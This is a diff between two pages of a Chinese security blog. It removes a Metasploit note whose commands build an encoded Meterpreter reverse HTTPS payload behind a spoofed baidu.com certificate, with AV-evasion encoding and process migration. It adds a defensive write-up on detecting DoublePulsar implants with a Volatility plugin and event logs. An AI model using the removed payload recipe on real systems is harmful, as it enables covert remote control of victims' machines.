@@ -8,7 +8,7 @@
   
   <meta name="author" content="c4bbage">
   
-  <title>metasplit使用笔记 - c4bbage blog</title>
+  <title>使用Volatility检测DoublePulsar SMB 和日志审查 - c4bbage blog</title>
   
 
   <link rel="shortcut icon" href="../img/favicon.ico">
@@ -23,9 +23,9 @@
   
   <script>
     // Current page data
-    var mkdocs_page_name = "metasplit使用笔记";
-    var mkdocs_page_input_path = "msf_usage.md";
-    var mkdocs_page_url = "/msf_usage/";
+    var mkdocs_page_name = "使用Volatility检测DoublePulsar SMB 和日志审查";
+    var mkdocs_page_input_path = "doublepulsar-smb-implant-detection-from-and-eventlog-detection.md";
+    var mkdocs_page_url = "/doublepulsar-smb-implant-detection-from-and-eventlog-detection/";
   </script>
   
   <script src="../js/jquery-2.1.1.min.js"></script>
@@ -124,8 +124,18 @@
 
         
             
-    <li class="toctree-l1 ">
-        <a class="" href="../doublepulsar-smb-implant-detection-from-and-eventlog-detection/">使用Volatility检测DoublePulsar SMB 和日志审查</a>
+    <li class="toctree-l1 current">
+        <a class="current" href="./">使用Volatility检测DoublePulsar SMB 和日志审查</a>
+        
+            <ul>
+            
+                <li class="toctree-l3"><a href="#volatilitydoublepulsar-smb">使用Volatility检测DoublePulsar SMB 和日志审查</a></li>
+                
+            
+                <li class="toctree-l3"><a href="#_1">日志审查</a></li>
+                
+            
+            </ul>
         
     </li>
 
@@ -161,19 +171,8 @@
 
         
             
-    <li class="toctree-l1 current">
-        <a class="current" href="./">metasplit使用笔记</a>
-        
-            <ul>
-            
-                <li class="toctree-l3"><a href="#metasploit">metasploit使用笔记</a></li>
-                
-                    <li><a class="toctree-l4" href="#_1">开启</a></li>
-                
-                    <li><a class="toctree-l4" href="#_2">引用</a></li>
-                
-            
-            </ul>
+    <li class="toctree-l1 ">
+        <a class="" href="../msf_usage/">metasplit使用笔记</a>
         
     </li>
 
@@ -267,11 +266,11 @@
     
       
         
-          <li>实用工具 &raquo;</li>
+          <li>兴趣关注 &raquo;</li>
         
       
     
-    <li>metasplit使用笔记</li>
+    <li>使用Volatility检测DoublePulsar SMB 和日志审查</li>
     <li class="wy-breadcrumbs-aside">
       
     </li>
@@ -281,39 +280,40 @@
           <div role="main">
             <div class="section">
               
-                <h1 id="metasploit">metasploit使用笔记</h1>
-<hr />
-<h2 id="_1">开启</h2>
-<pre><code class="shell">db_connect ./database.yml
-use payload/windows/meterpreter/reverse_https
-set overridelhost www.baidu.com
-set OverrideRequestHost true
-set OverrideLPORT 443
-openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
-    -subj &quot;/C=US/ST=Texas/L=Austin/O=Development/CN=www.baidu.com&quot; \
-    -keyout www.baidu.com.key \
-    -out www.baidu.com.crt &amp;&amp; \
-cat www.baidu.com.key  www.baidu.com.crt &gt; www.baidu.com.pem &amp;&amp; \
-rm -f www.baidu.com.key  www.baidu.com.crt
-set handlersslcert ./www.baidu.com.pem
-set StagerVerifySSLCert=true
-set EnableStageEncoding true
-generate -E -b '\x00\xff' -f /tmp/baidu.com.exe -t exe -a x86 --platform win -e x86/shikata_ga_nai -i 2
-set autorunscript post/windows/manage/migrate NAME=explorer.exe
-</code></pre>
-
-<blockquote>
-<p>windows server 2003 sp2 测试不能连接成功,win2008 win7 win10均无问题</p>
-</blockquote>
-<h2 id="_2">引用</h2>
+                <h1 id="volatilitydoublepulsar-smb">使用Volatility检测DoublePulsar SMB 和日志审查</h1>
 <ul>
-<li><a href="https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode">Meterpreter Paranoid Mode</a></li>
-<li><a href="https://blog.cobaltstrike.com/2013/06/28/staged-payloads-what-pen-testers-should-know/">Staged Payloads – What Pen Testers Should Know</a></li>
-<li><a href="https://community.rapid7.com/community/metasploit/blog/2013/02/01/stage-encoding-or-how-i-learned-to-stop-worrying-and-love-the-string-operator">阶段编码</a></li>
-<li><a href="https://arno0x0x.wordpress.com/2016/04/13/meterpreter-av-ids-evasion-powershell/">Meterpreter stage AV/IDS evasion with powershell</a></li>
-<li><a href="http://security.stackexchange.com/questions/131789/metasploit-meterpreter-persistence-script-alternatives">Metasploit Meterpreter Persistence Script Alternatives</a></li>
-<li><a href="https://github.com/rsmudge/metasploit-loader">metasploit loader</a></li>
+<li>作者:c4bbage</li>
+<li>时间:2017.8.15</li>
+<li>
+<p>链接:http://dobest1.com/doublepulsar-smb-implant-detection-from-and-eventlog-detection/</p>
+<p>http://www.shelliscoming.com/2017/08/doublepulsar-smb-implant-detection-from.html</p>
+</li>
 </ul>
+<p><em>近期公司windows（阿里云）有被日掉，怀疑是永恒之蓝作祟，随之收集资料学习。</em></p>
+<p>在过去的几个月里，有各种各样的攻击者以及使用FuzzBunch框架攻击系统的script kiddies。</p>
+<p>在最近的一次事件中，我正在分析一个内存转储，我花了一些时间来确定感染载体是EternalBlue。一旦我发现ring0 shellcode（与DoublePulsar相关），我能更容易的分析出来。 为了以后能快速的分析，我开发了一个<a href="https://github.com/BorjaMerino/DoublePulsar-Volatility/blob/master/doublepulsar.py">虚拟插件</a>，以便于找到这种入侵的痕迹。</p>
+<p>该插件不是基于Yara规则。它只是从srv.sys驱动程序中转储SrvTransaction2DispatchTable 函数数组，并检查它们指向de 二进制地址空间（请查看好的<a href="https://zerosum0x0.blogspot.com.es/2017/04/doublepulsar-initial-smb-backdoor-ring.html">Zerosum0x0分析</a>）。要注意的是，虽然插件转储整个表，但实际上只需要验证SrvTransactionNotImplemented符号指向的正确位置。</p>
+<p>这个插件通过从调试目录获取到的.pdb 路径，并从http://msdl.microsoft.com/download/symbols（或您提供的服务器与SYMBOLS选项）下载它，来解析 SrvTransaction2DispatchTable。一旦获得符号偏移量，它只会转储指针数组。如果SrvTransactionNotImplemented（条目14）指向"unknown"位置，那么您可能正在处理DoublePulsar事件。这样的话，<strong>volshell</strong>和<strong>dis()</strong>会清除任何疑问。</p>
+<p>让我们看一个例子。以下图像是已被EternalBlue + DoublePulsar攻击的Windows 7 SP1 x64主机：</p>
+<p><img alt="" src="../images/vol-doublepulsar.png" />
+通过检查"unknown"位置的代码，我们可以验证我们正在处理DoublePulsar。注意操作码0x23（ping），0xc8（exec），0x77（kill）。</p>
+<p><img alt="" src="../images/volshell-doublepulsar.png" />
+在以前的情况下，符号文件已从Microsoft下载。如果您的主机没有Internet连接，您可以通过PDB_FILE选项提供pdb文件。我通常使用Radare来获得这个。</p>
+<p><img alt="" src="../images/val-radare-pdb.png" />
+要运行插件，请确保具有以下依赖关系：
+<em>    construct:     pip install construct==2.5.5-reupload
+</em>    pdbparse:      pip install pdbparse
+<em>    pefile:        pip install pefile
+</em>    requests:      pip install requests
+*    cabextract:    apt-get install cabextract</p>
+<p>动图展示:
+<img alt="" src="../images/doublepulsar_vol.gif" />
+插件地址:
+* <a href="https://github.com/BorjaMerino/DoublePulsar-Volatility">BorjaMerino/DoublePulsar-Volatility</a></p>
+<h1 id="_1">日志审查</h1>
+<pre><code>还可以使用EventLog进行审核，在日志中搜素"0x00000050 (0xfffffa800d189000"
+#https://twitter.com/GossiTheDog/status/856986283721326592
+</code></pre>
               
             </div>
           </div>
@@ -321,10 +321,10 @@ set autorunscript post/windows/manage/migrate NAME=explorer.exe
   
     <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
       
-        <a href="../cobaltstrike_usage/" class="btn btn-neutral float-right" title="cobalt strike 杂记">Next <span class="icon icon-circle-arrow-right"></span></a>
+        <a href="../handle_csrf_token_with_burpsuite_or_sqlmap/" class="btn btn-neutral float-right" title="用Burpsuite 来处理csrf token">Next <span class="icon icon-circle-arrow-right"></span></a>
       
       
-        <a href="../debian8_install_msf/" class="btn btn-neutral" title="debian8安装metasploit"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../log4j-deserialization-vuln/" class="btn btn-neutral" title="log4j deserialization vuln"><span class="icon icon-circle-arrow-left"></span> Previous</a>
       
     </div>
   
@@ -350,10 +350,10 @@ set autorunscript post/windows/manage/migrate NAME=explorer.exe
     <span class="rst-current-version" data-toggle="rst-current-version">
       
       
-        <span><a href="../debian8_install_msf/" style="color: #fcfcfc;">&laquo; Previous</a></span>
+        <span><a href="../log4j-deserialization-vuln/" style="color: #fcfcfc;">&laquo; Previous</a></span>
       
       
-        <span style="margin-left: 15px"><a href="../cobaltstrike_usage/" style="color: #fcfcfc">Next &raquo;</a></span>
+        <span style="margin-left: 15px"><a href="../handle_csrf_token_with_burpsuite_or_sqlmap/" style="color: #fcfcfc">Next &raquo;</a></span>
       
     </span>
 </div>
